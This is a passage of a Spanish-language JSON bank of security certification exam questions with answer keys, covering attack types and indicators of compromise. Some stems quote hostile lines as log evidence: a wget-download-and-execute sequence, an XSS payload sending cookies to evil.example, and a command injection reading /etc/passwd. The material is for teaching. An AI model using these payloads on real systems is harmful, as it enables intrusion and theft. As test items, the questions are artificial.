Dos semanas antes, asistió a una conferencia donde alguien se le acercó con una mochila voluminosa. ¿Qué ataque es el MÁS probable?","options":["RFID cloning","Credential replay de hashes NTLM","Environmental attack","Brute force"],"answer":[0],"explanation":"Los lectores RFID ocultos pueden leer y copiar tarjetas de proximidad a corta distancia; el uso simultáneo de la credencial mientras la tarjeta original sigue con la empleada indica clonación. No hay intentos repetidos (brute force), ni hashes de red, ni manipulación de condiciones ambientales."},{"id":"D2-044","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Tras comprometer una estación de trabajo, el atacante extrae hashes NTLM de la memoria con una herramienta como Mimikatz y, sin descifrarlos, los usa para autenticarse en servidores de archivos como administrador del dominio. ¿Qué ataque describe MEJOR esta actividad?","options":["Downgrade attack","Brute force","Birthday attack","Credential replay (pass-the-hash)"],"answer":[3],"explanation":"Reutilizar un hash o credencial capturada para autenticarse sin conocer la contraseña es credential replay (pass-the-hash). No se prueban contraseñas (brute force), no se buscan colisiones de hash (birthday) ni se fuerza un protocolo más débil (downgrade)."},{"id":"D2-045","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Durante la investigación de un incidente, el SIEM no tiene eventos del controlador de dominio DC01 entre las 01:10 y las 03:45. El primer evento después de ese intervalo es:\n```\nEvent ID 1102  The audit log was cleared.  Account: svc_backup\n```\n¿Qué indicador de actividad maliciosa es el MÁS evidente?","options":["Blocked content","Resource consumption","Out-of-cycle logging","Missing logs"],"answer":[3],"explanation":"Un vacío en los registros y el evento 1102 (log de auditoría borrado) indican que el atacante eliminó evidencia: missing logs. Out-of-cycle logging se refiere a eventos registrados en momentos inusuales, no a su ausencia; no hay contenido bloqueado ni consumo anómalo de recursos."},{"id":"D2-046","domain":2,"objective":"2.4","type":"single","difficulty":1,"stem":"En un servidor web Linux se encuentra el siguiente historial de comandos de la cuenta del servicio web:\n```\nwww-data$ wget http://198.51.100.9/x -O /tmp/x\nwww-data$ chmod +x /tmp/x && /tmp/x\n# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n¿Qué ataque ocurrió?","options":["Downgrade attack","Credential replay","Privilege escalation","Directory traversal"],"answer":[2],"explanation":"La cuenta sin privilegios `www-data` ejecutó un exploit y obtuvo un shell con uid=0 (root): privilege escalation. No hay manipulación de rutas con `../`, ni reutilización de credenciales capturadas, ni negociación de protocolos más débiles."},{"id":"D2-047","domain":2,"objective":"2.4","type":"multi","difficulty":3,"stem":"Los registros de una aplicación web interna muestran:\n```\n10.0.5.23 \"GET /buscar?q=\u003cscript>fetch('//evil.example/?c='+document.cookie)\u003c/script>\" 200\n10.0.5.23 \"GET /diagnostico/ping?host=8.8.8.8;cat%20/etc/passwd\" 200\n```\n¿Qué DOS ataques se están intentando? (Elige DOS.)","options":["Command injection","SQL injection","Directory traversal","Cross-site scripting (XSS)","Cross-site request forgery (CSRF)","Replay attack"],"answer":[0,3],"explanation":"La primera solicitud inyecta un `\u003cscript>` para robar cookies (XSS). La segunda encadena con `;` un comando del sistema operativo al parámetro `host` (command injection). Aunque aparece `/etc/passwd`, no hay secuencias `../`, por lo que no es directory traversal; tampoco hay sintaxis SQL, solicitudes forzadas ni tráfico reenviado."},{"id":"D2-048","domain":2,"objective":"2.4","type":"multi","difficulty":3,"stem":"Un analista del SOC observa en un servidor de archivos: CPU al 98 %, miles de escrituras de disco por minuto y archivos renombrados como `presupuesto.xlsx.lckd`. Los usuarios reportan que no pueden abrir sus documentos en la unidad compartida. ¿Qué DOS indicadores de actividad maliciosa están presentes? (Elige DOS.)","options":["Account lockout","Resource inaccessibility","Concurrent session usage","Impossible travel","Published/documented","Resource consumption"],"answer":[1,5],"explanation":"El uso extremo de CPU y disco es resource consumption, y la imposibilidad de abrir los archivos cifrados es resource inaccessibility, ambos típicos de ransomware. No hay datos de ubicación de inicio de sesión, sesiones simultáneas, publicaciones externas ni bloqueos de cuentas."},{"id":"D2-049","domain":2,"objective":"2.4","type":"match","difficulty":2,"stem":"Empareja cada descripción con el tipo de malware que MEJOR le corresponde.","items":["Supervisa la navegación y recopila información personal del usuario sin su consentimiento para enviarla a terceros.","Una \"calculadora gratuita\" funciona correctamente, pero además instala una puerta trasera.","Aplicaciones preinstaladas por el fabricante que consumen recursos y que el usuario no necesita.","Registra cada pulsación de teclado y envía el contenido cada hora a un servidor externo.","Código que se adjunta a ejecutables y se propaga cuando el usuario ejecuta el archivo infectado.","Se propaga solo por la red explotando una vulnerabilidad de SMB, sin interacción del usuario."],"choices":["Trojan","Virus","Worm","Keylogger","Bloatware","Spyware"],"answer":[5,0,4,3,1,2],"explanation":"El trojan se disfraza de software legítimo; el virus requiere que el usuario ejecute el archivo infectado; el worm se autopropaga por la red; el keylogger captura pulsaciones; el bloatware es software innecesario preinstalado; y el spyware recopila información del usuario sin su consentimiento."},{"id":"D2-050","domain":2,"objective":"2.4","type":"match","difficulty":3,"stem":"Empareja cada observación con el indicador de actividad maliciosa correspondiente.","items":["Los usuarios no pueden acceder a un servidor de archivos que dejó de responder.","La misma cuenta mantiene dos sesiones VPN activas al mismo tiempo desde equipos distintos.","Aparecen registros de instalación de software a las 03:00 de un domingo, fuera de cualquier ventana de cambios.","El proxy rechaza para varios usuarios las descargas de un dominio clasificado como malware.","Un usuario no puede iniciar sesión porque su cuenta quedó bloqueada, aunque no ha intentado autenticarse.","Un investigador publica en su blog que credenciales de la empresa aparecen en un volcado reciente."],"choices":["Account lockout","Concurrent session usage","Blocked content","Out-of-cycle logging","Published/documented","Resource inaccessibility"],"answer":[5,1,3,2,0,4],"explanation":"Un bloqueo sin intentos legítimos sugiere ataques de contraseña (account lockout); dos sesiones simultáneas de la misma cuenta es concurrent session usage; el rechazo del proxy es blocked content; la actividad registrada fuera de horario o de ciclo es out-of-cycle logging; la información divulgada por terceros es published/documented; y un servicio inaccesible es resource inaccessibility."},{"id":"D2-051","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"El WIDS de la empresa genera estas alertas en la misma área:\n```\nSSID \"Corp-WiFi\"  BSSID 00:1
